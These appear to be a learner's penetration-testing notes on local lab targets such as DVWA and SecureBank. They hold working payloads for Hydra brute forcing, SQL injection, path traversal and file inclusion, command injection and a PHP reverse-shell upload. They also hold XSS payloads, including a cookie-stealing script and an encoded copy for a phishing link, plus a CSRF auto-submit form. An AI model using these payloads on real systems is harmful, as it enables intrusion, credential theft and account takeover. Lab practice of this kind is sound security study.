
## Bruteforce a Login Page

Brute forcing the DVWA (Damn Vulnerable Web Application) login using **Hydra** and a **SecLists** wordlist is a common and legal practice if done **locally** for ethical hacking practice or study. Below is a step-by-step guide on how to do it.

#### Target Info:

- Target URL: `http://172.17.0.2/login.php`

- Form fields: `username` and `password`

- Failure message: `"Login failed"` or whatever appears when credentials are wrong.

**Hydra Command Example:**

```bash
hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt \
      -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt \
      127.0.0.1 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"
```

---

### 🔍 Explanation:

- `-L`: Path to usernames list (use `-l` for single username)
    
- `-P`: Path to passwords list
    
- `http-post-form`: Hydra module for POST form-based login
    
- `/dvwa/login.php`: Path to login form
    
- `username=^USER^&password=^PASS^&Login=Login`: How the POST data is structured
    
- `:Login failed`: This tells Hydra how to detect a **failed** login attempt
    

---

### ⚠️ Important Notes:

- Use **Burp Suite** or **browser dev tools** to inspect the exact POST structure and response messages.
    
- Set **DVWA security to low**, or else the login will have CSRF tokens or other protections that block brute force.
    
- Use `127.0.0.1` or your local IP instead of `localhost` if Hydra has DNS issues.
    
- You can also add `-V` for verbose output or `-t 4` to set number of parallel threads.
    

---

Would you like help crafting a **custom hydra command** based on your exact DVWA setup (e.g., CSRF token, security level)? Just share the login form structure.


---
## Web Components

- Web Clients (Browsers)
- Web Servers
- Web Applications
- HTML Documents
- CSS Stylesheets
- JS Files
- Dynamicism:
	- Client Side (thanks to js)
	- Server Side (thanks to web applications)



```
curl -v http://localhost
```


**ASCII stands for American Standard Code for Information Interchange.** It's a character encoding standard that represents letters, numbers, punctuation, and control characters as numerical values. These numerical values are used to exchange data between computers and printers. 


- HTTP is stateless
- How are those request sent and how can the be modified
- Explain Unathorization Bypass
- Explain Proxy Tools

BurpSuite is a man in the middle but now we control it and the http request being sent to the server.

**Proxylisteners**: listens for incomming http traffic (proxy servers)

## BurpSuite

Burp Suite is a powerful suite of web application security testing tools used for penetration testing.

- A java application

- Launch Burp
- Install and setup FoxyProxy 
- test if browser is working
- install PortSwigger Browser Cert
- Configure Burp Scope (proxy/http history) (target/sitemap - domain names) + filter scope data
- The Intercept Section
- Repeter modify the request and send it back again
- Broken access control remove the session id then try to check user info
- Decoder Section for decoding cookies
- Create a new user and analyse the cookies
- Try acessing the AdminStore and change the cookie
- Intruder tab look at the attacks used for bruteforce attacks
- Sequncer is for modifing cookies
- Live Passive scan on the dashboard also diaplay target map, add websites to scope
- Issues tab on target shows a list of issues detected by burp scanner
- Extensions - BApp Store

###  SQL Injection

#### DVWA

- Using DVWA - admin:password ++ create databse to go to dashboard.
- start with low level - add 1-6 to search bar .
  
- go to burp and analys that request and add (') in the (id=') .
  
- Valid data we get results invalid data we get an sql error (manipulating sql structure query) .
  
- **Low Security**

- `1' OR '1'='1'#`  when we uncode it using url encode key characters (CRTL + U) we get a list of all users (Basic Payload). 
  
- Our second attempt will be to display the existing tables within the database using the payload : 

```sql
'UNION SELECT table_name, NULL FROM information_schema.tables #
```
  
- Next, we’ll retrieve and display the columns of the users table by using the query : 

```sql
'UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name= 'users' #
```
  
- We can also access the usernames along with their encrypted passwords: 

```sql
'UNION SELECT user, password FROM users #
```


- **Analyzing Medium Security Source Code**

- If we can’t inject the input directly through the form, we can use Burp Suite to do it .
  
- Select a user id the analys captures then send to repeter modify it the check the response.
  
- repeat evering above but make sure you encode in url key charcters (CRTL + U) NOTE:  NO (') is required.
  
- By intercepting the request, we can modify the input parameter encode it then, send the request, and then view the results in the response .

```sql
id=1 UNION SELECT user, password FROM users #
```


#### SecureBank

```
docker run -d -p 80:80 -p 5000:5000 -p 1080:1080 -e 'SeedingSettings:Admin=admin@ssrd.io' -e 'SeedingSettings:AdminPassword=admin' ssrd/securebank
```


```
## LOGIN INFO

Username=admin@ssrd.io
Password=admin
```

- Go to transaction then the search field the input (') inspect the record in the proxy history send it to repeter then modify it this way in the (%20)

```sql
' UNION SELECT * FROM Transactions --
```

- Lets say we want to display all the records

```sql
' UNION SELECT 1, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
```


- Lets try diffrent ids

```sql
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, 'string' FROM Transactions --
```

- Check database info

```sql
' UNION SELECT 10, 'string', 'string', '02/24/2024', 'string', 1, @@version FROM Transactions --
```


### Directory Traversal


Directory traversal, also known as path traversal, is a web security vulnerability that allows an attacker to access files and directories outside the intended scope of a web application. This is achieved by manipulating file paths, often using the `../` sequence, to navigate the file system upwards and access restricted files or directories.

Path Traversal, also known as Directory Traversal, is a type of security vulnerability that occurs when an attacker manipulates variables that reference files with “dot-dot-slash (../)” sequences or similar constructs. This can allow the attacker to access arbitrary files and directories stored on the file system.


Download Apache Tom Cat tar file from their website and configure it :

1. Change Connector port="1337"
2. Permmision to execute files in bin folder.
3. Run this script ` ./catalina.sh run `
4. Open browser ` localhost:1337 `




**Fuzzing**: an automated software testing technique that uses randomly generated inputs to find vulnerabilities and bugs in software.

**wfuzz - is a web application bruteforcer**

**Syntax:** 

```
wfuzz -w wordlist http://192.168.1.89:80/dvwa/?FUZZ=test
```

Here are some examples of suggestive parameters to analyze and test for Directory Traversal vulnerabilities:

> ?file=
> 
> ?f=
> 
> /file/someFile
> 
> ?location=
> 
> ?l=
> 
> /location/someLocation
> 
> search=
> 
> s=
> 
> /search/someSearch
> 
> ?data=
> 
> ?d=
> 
> /data/someData
> 
> ?download=
> 
> ?d=
> 
> /download/someFileData



- Lets practice in the secure bank and use burp tuen on filter images
- Log in in and vist the profile and open the profile image in new tab to intercept the request

```
http://127.0.0.1/api/User/ProfileImage?user=admin@ssrd.io
```


- send the request to repeter and change the username data with :

```
../../../../../../../../../etc/passwd
```

- it will display content inside the passwd


### File Inclusion

A **File Inclusion vulnerability** is a web security flaw that allows an attacker to include and execute files on a server through the web application.

This can lead to sensitive data disclosure, code execution, or even server compromise. 

There are two main types: Local File Inclusion (LFI) and Remote File Inclusion (RFI). 

**Local File Inclusion (LFI)**

LFI allows attackers to include files located on the server itself. 
Attackers can use LFI to read sensitive files like configuration files, source code, or potentially execute malicious code. 

LFI vulnerabilities are often found in web applications that use scripting languages like PHP and allow users to specify filenames or paths to be included. 

**Examples:**

```php
<?php
include($_GET['page']);
?>

```


```
http://example.com/index.php?page=../../../../etc/passwd
```

**Remote File Inclusion (RFI)**

RFI allows attackers to include files from remote URLs, such as a malicious script hosted on their own server. 

- Only works if `allow_url_include` is enabled in `php.ini` (usually off by default).

Attackers can use RFI to upload malicious files or inject code into the application. 
RFI vulnerabilities are often found in web applications that use scripting languages like PHP that allow URLs to be included in the application. 



- Test this :

```
../../../../../../../../../etc/passwd
```

The message **"The PHP function `allow_url_include` is not enabled"** means that **remote file inclusion (RFI)** using `include()` or `require()` with **remote URLs** is **disabled** in your PHP configuration.

- Take a look at DVWA file inclusion section (low) and checkout the 3 files and change url to file4.php 

- click on the view source 

- The code takes a value from the page parameter in the URL using the GET method and assigns it to the $file variable, which will then be loaded and displayed on the web page. The lack of validation or sanitization makes it vulnerable to File Inclusion attacks.


- (Medium Level) After looking through the code, i noticed it uses the str_replace function to remove http:// and https:// by replacing them with an empty string. This behavior effectively strips these prefixes from any input. Similarly, both ../ and ..\\ are replaced with an empty string.

- However, if we use …/./, the ../ in the middle is replaced with a blank space, and the remaining values collapse to ../, allowing us to navigate using this approach.

```
page=file4.php..././..././..././.....././..././...//..././..././..././..././..././etc/passwd
```


```
page=php://filter/convert.base64-encode/resource=../../../../../../../../../etc/passwd
```

- As you can see, it worked perfectly, and we were able to access the contents of the /etc/passwd file.


- (High Level) After reviewing the code, I found that it throws an error if the file doesn’t start with file and isn’t include.php 
  
- To solve this, we’ll use the file:// protocol, which allows us to read local files from the system rather than from the web server.


```
page=file:///etc/passwd
```


- Leak source code with php filters

```
page=file4.php....//....//....//....//....//....//....//etc/passwd
```


### File Upload 

File upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. 

This can allow attackers to upload **malicious files** (like shells, scripts, or executables) and **compromise the server**.

It's important that you have a basic understanding of how servers handle requests for static files.

```php
if (move_uploaded_file($_FILES['file']['tmp_name'], "uploads/" . $_FILES['file']['name'])) {
    echo "File uploaded!";
}
```

**How it Works:**

- It **checks** if a file was sent.

- It **validates**:
    
    - Is it too big?
    
    - Is it the right type (like `.jpg`, `.png`)?
    
    - Is it really an image and not a fake?
    
- It **moves the file** to a folder like `/uploads/`.

- The server can respond in `Upload successful!` or `File type not allowed`


- (Easy Level ) upload a file and it will show the upload success and the path it has uploaded to.
- Upload a php reverse shell (change ip and listening port) and start a netcat listener on your machine.
  
- (Medium Level) Check the source. After analyzing the code, I noticed a validation check where the uploaded file must be either a JPEG or PNG image format and must also be smaller than 100000 bytes.
- Intercept that upload process in burp and send the failed message to repeter
- Change the Content-Type to an image/png and send the request and the file is now uploaded, visit the location to get reverse shell


- (High Level) Check the source. I noticed a condition using the substr function that checks the file extension. This ensures the uploaded file is genuinely a JPEG, JPG, or PNG.
- Now, with the help of this Github link, we will be able to inject a custom payload into the image file using exiftool.
- To use the injected payload, we will use the command injection challenge we already completed to rename it to image.php.

```
127.0.0.1|mv ../../hackable/uploads/image.jpeg ../../hackable/uploads/image.php
```

- Now, it’s time to open image.php in the browser.




### Command Injection

Command injection is when an attacker can run any commands on a remote system. This usually happens when a web application or server doesn’t properly handle user input, giving the attacker the chance to inject and run commands that the system would normally execute.

- The website lets you **enter something**, and it sends that to the server. If the server uses your input in a **system command** without checking it first, an attacker can **inject commands** and control the server.
- This works because the server treats everything the user types as part of one big command, allowing the hacker to take control or steal information if the server isn’t protected.

- (Easy Level) enter an ip address that you would like to ping.
- Explain how shell works. **A shell is a program that acts as an interface to the operating systemwhich allows users to enter and execute commands.**
  
- On thing to note is that we are interacting to the web app using our browser and what is enabling us to do that is the http protocol.The web app interactes with the server shell using php code.
  
- How can we exploit this we need to inject a payload that is able to be interpreted by the shell.
  
- Since all commands from the website are sent to the shell why not send malicious commands. We can exploit this if the web app logic for chaecking user input does not sanitize data.**Data sanitization is the process of removing or modifying data to protect from malicious inputs.**

- Enter the following to start and will see a new line

```
127.0.0.1; whoami
```


```
127.0.0.1; cat /etc/passwd
```


- The source code shows that the input requires an IP address, triggering a ping command via shell_exec. On Windows, it sends 4 packets, while on other systems, it sends 3 to avoid manual interruption with Ctrl+C.The source code shows that the input requires an IP address, triggering a ping command via shell_exec. On Windows, it sends 4 packets, while on other systems, it sends 3 to avoid manual interruption with Ctrl+C.

- The semicolon allows us to run multiple commands in a single line. the shell reads it as execute command on the left the execute the other on the right.
  
- We can also use && in the command :

```
127.0.0.1 && cat /etc/passwd
```

- What this does is, if the first command works, it will automatically run the second one and show us the contents of the /etc/passwd file.

- Check in burp to see the submit parameter. The string from php code is interpred as an os command.


- (Medium Level) start with basics
- After reviewing and analyzing the code, we can notice the presence of the str_replace function, which replaces && and ; with spaces, effectively blocking the use of these operators to chain commands in the Medium security level.

- If you have interacted with shell you now we can use `|`  to run multiple commands.

```
127.0.0.1 | cat /etc/passwd
```


- (High Level) After taking a closer look at the code, you’ll notice that characters like &, semicolons, and pipes get replaced with spaces.
- I found that by eliminating the spacing, I could use the pipeline to execute the command like this :

```
127.0.0.1 |cat /etc/passwd
```



### Cross Site Scripting

A cross-site scripting (XSS) attack is one in which an attacker is able to get a target site to execute malicious code as though it was part of the website.

Make your websites dynamic and interactive with JavaScript!

A web browser downloads code from many different websites and runs it on the user's computer.

The **Document Object Model** (**DOM**) connects web pages to scripts or programming languages by representing the structure of a document—such as the HTML representing a web page—in memory.

All XSS attacks depend on a website doing two things:

1. Accepting some input that could have been crafted by an attacker
2. Including this input in a page without _sanitizing_ it: that is, without ensuring that it won't be executable as JavaScript.

There are three main types of XSS attacks. These are:

- **Reflected XSS**, where the malicious script comes from the current HTTP request.
- **Stored XSS**, where the malicious script comes from the website's database.
- **DOM-based XSS**, where the vulnerability exists in client-side code rather than server-side code.



**Stored XSS**

- Write a message or a comment which is seen by anyone who has access to the page.
  
- Check the source code on the form section then check http request in burp by turning on intercept mode on right click then `do intercept request from this response`.

- Open the dev tools and write some JS codes.

```js
alert("Hello")
```


- (Low Level) Turning on intercept mode on right click then `do intercept request from this response`. then insert this to the comment box:

```html
<script>alert("hello!")</script>
```


```html
<img src=x onerror=alert(“You_are_hacked!”)>
```

- Now lets check what happened by examining the http request in burp.
- It can be observed that provided payload executed successfully and pop-up is generated.
- In case of Stored XSS, the provided input will be permanently store in the database and whenever anyone go to that particular page the provided payload will execute.

- Why is it a problem? Because an attacker can run scripts that were not intended by the user or developer of the site and steal sensitive information.

- Now lets try something malicious.

- run the following code in your dev tools.

```js
document.cookie
```


```js
<script>
var xhr = new XMLHttpRequest();xhr.open('GET', `http://localhost:1337/${document.cookie}`, false);xhr.send(null);
</script>
```

- We cant insert the entire code in our message box so we send the request to the burp repeter.

- lets create a http server using python to capture this cookies from our targets

```python
python3 -m http.server 1337
```

- Now send the request to the server and click a diffrent page then go back to store xss page and check the terminal.

- If this script is injected into a vulnerable website (via XSS), any user who loads the page will unknowingly send their cookies to the attacker's server (here, `localhost:1337` is used, but in real attacks, it would be a remote IP or domain controlled by the attacker).


**Reflected XSS**

- Insert this in the input field

```
Hello
```

```html
<b>Brian</b>
```


- The data is not validated its executed by the server directly.

```javascript
<script>alert(1000)</script>
```

- Lets analyes the response in burp.

- What is the problem here? The problem is not that our browser is vunrable because its supposed to execute scripts, now the problem is the user output was able to introduce javascript code to the server response.

- Create a phishing link using cyberChef by URL encoding the payload below and add it to a url.

```js
<script>dmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpO3hoci5vcGVuKCdHRVQnLCBgaHR0cDovL2xvY2FsaG9zdDoxMzM3LyR7ZG9jdW1lbnQuY29va2llfWAsIGZhbHNlKTt4aHIuc2VuZChudWxsKTs=</script>
```


**DOM-based XSS**

- The DOM makes the changes to a webpage dynamicaly.

The **Document Object Model** (**DOM**) connects web pages to scripts or programming languages by representing the structure of a document—such as the HTML representing a web page—in memory.


- Play around with the dom using developer tools.
- Inspect the source code of the select option js code.
- On the url delete the language and add this:

```js
<script>alert(1000)</script>
```

- Analyse the code in the source code.
- Analyse now on burp with intercept on and then `do intercept request from this response`.
  
- Who is responsible for this the server or client, and whats the diffrence btwn dom and reflected xss.


- In DOM xss the client is responsible for creating the malicious payload code, on the refrelected xss its the server creates it then reflecting the payload to the website were its executed.

- The server does not put the payload into the HTML directly what happens is the server replies with the javascript created by the application, then javascript introduces the payload to the DOM in the client side by itsself.

- Lets hide the payload to the server add `#` to the url

```
http://172.17.0.2/vulnerabilities/xss_d/#?default=<script>alert(1000)</script>
```

- Analyse the respose in burp using intercept the foward until you get the alert.




### Cross Site Request Forgery (CSRF)

Cross-site request forgery (CSRF) is a web security vulnerabilit_y that tricks authenticated users into submitting unintended requests.

This attack exploits the trust a web application has in a user’s browser, allowing an attacker to perform unwanted actions on behalf of a user.

By leveraging the user’s authenticated session, an attacker can send unauthorized commands, potentially leading to data modification or unauthorized transactions. The essence of CSRF is that it exploits the user’s trust in the application rather than exploiting vulnerabilities within the application itself.

**Example of a Malicious form**

```html
<form action="https://bank.com/transfer" method="POST" style="display:none;">  
<input type="hidden" name="amount" value="1000">  
<input type="hidden" name="to" value="attacker_account">  
</form>  
<script>  
document.forms[0].submit();  
</script>
```

#### How CSRF Works

**The mechanics of CSRF can be illustrated through a simple example:**

1. **User Authentication:** A user logs into their online banking account, receiving an authentication cookie that validates their session.
2. **Malicious Link:** The user visits a malicious website while still logged into their banking account. This website contains a hidden form that submits a request to transfer money.
3. **Automatic Submission:** The malicious script automatically submits the form using the user’s authentication cookie, resulting in the bank processing a transaction without the user’s consent.



- (Low Level) We test the password change function then we intercept using burp check the GET request url.
- Paste the url on you browser and enter a diffrent password.
- Log out and test the new password, now this link can be sent to a user forcing the user to change the password.


- (Medium Level) lets try using that link again to get a new password. We get a warning about the request.
- We will have to use another vunrability to bypass request check, so will use the stored xss, reduce the level to low.
- Add this code in the message input field and mess with the source code to remove word restriction.

```
<img src="http://172.17.0.2/vulnerabilities/csrf/?password_new=hacker&password_conf=hacker&Change=Change">
```

- Now go to burp proxy history and check for a POST and GET request.
- You will see the server sent a GET request and the password wa changed.




- (High Level) 



---
### DVWA Walkthrough

[Playlist][https://youtube.com/playlist?list=PLHUKi1UlEgOJLPSFZaFKMoexpM6qhOb4Q&si=zGv2l_R1GrIftoBN]